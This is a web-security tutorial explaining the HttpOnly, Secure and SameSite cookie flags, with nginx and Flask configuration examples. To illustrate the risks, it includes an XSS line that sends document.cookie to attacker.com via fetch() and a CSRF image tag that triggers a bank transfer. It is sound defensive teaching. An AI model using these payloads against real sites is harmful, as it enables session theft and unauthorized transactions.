# Cookie Security Flags — Deep Dive

## What is a Cookie?

A small piece of data the server sends to the browser to store. The browser sends it back automatically on every matching request.

```
Set-Cookie: session=a3f9xK92m; HttpOnly; Secure; SameSite=Strict; Path=/; Max-Age=3600
```

---

## The Three Security Flags

### 1. `HttpOnly`

**What it does:** Prevents JavaScript from accessing the cookie via `document.cookie`.

**Without it:**
```javascript
// Attacker's XSS payload in your page:
fetch("https://attacker.com/steal?c=" + document.cookie);
// → Session cookie sent to attacker's server
```

**With it:** `document.cookie` returns an empty string for HttpOnly cookies. The browser still sends the cookie to the server — JavaScript just can't read it.

**Always set this on session cookies. No exceptions.**

---

### 2. `Secure`

**What it does:** Cookie is only sent over **HTTPS** connections, never plain HTTP.

**Without it:** On a coffee shop Wi-Fi, anyone running a network sniffer sees:
```
GET /dashboard HTTP/1.1
Host: yourbank.com
Cookie: session=a3f9xK92m     ← stolen
```

**With it:** The browser refuses to send the cookie if the connection is HTTP.

**Always set this on any cookie that matters.**

---

### 3. `SameSite`

**What it does:** Controls whether the cookie is sent on **cross-site requests**.

| Value | Behavior |
|-------|---------|
| `Strict` | Cookie NEVER sent on cross-site requests |
| `Lax` | Cookie sent on top-level navigation (clicking a link), not on sub-requests |
| `None` | Cookie sent everywhere (requires `Secure`) |

**Without SameSite (or with `None`):** CSRF attacks work:
```html
<!-- On attacker's website: -->
<img src="https://yourbank.com/transfer?to=attacker&amount=1000">
<!-- Browser sends your session cookie automatically → transfer executes -->
```

**With `SameSite=Strict`:** Cross-site requests don't include the cookie → CSRF fails.

---

## Correct Configuration (Nginx Example)

```nginx
# nginx.conf
add_header Set-Cookie "session=$cookie_session; HttpOnly; Secure; SameSite=Strict; Path=/";
```

## Correct Configuration (Python Flask Example)

```python
app.config.update(
    SESSION_COOKIE_HTTPONLY=True,
    SESSION_COOKIE_SECURE=True,       # Requires HTTPS
    SESSION_COOKIE_SAMESITE='Strict',
)
```

---

## Quick Reference

| Flag | Protects Against | Must Have? |
|------|-----------------|------------|
| `HttpOnly` | XSS cookie theft | ✅ Always |
| `Secure` | Network interception (HTTP sniffing) | ✅ Always (on HTTPS sites) |
| `SameSite=Strict` | CSRF attacks | ✅ Recommended |
| `Max-Age` / `Expires` | Eternal sessions | ✅ Always set an expiry |
| `Path=/` | Cookie scope limiting | ✅ Best practice |
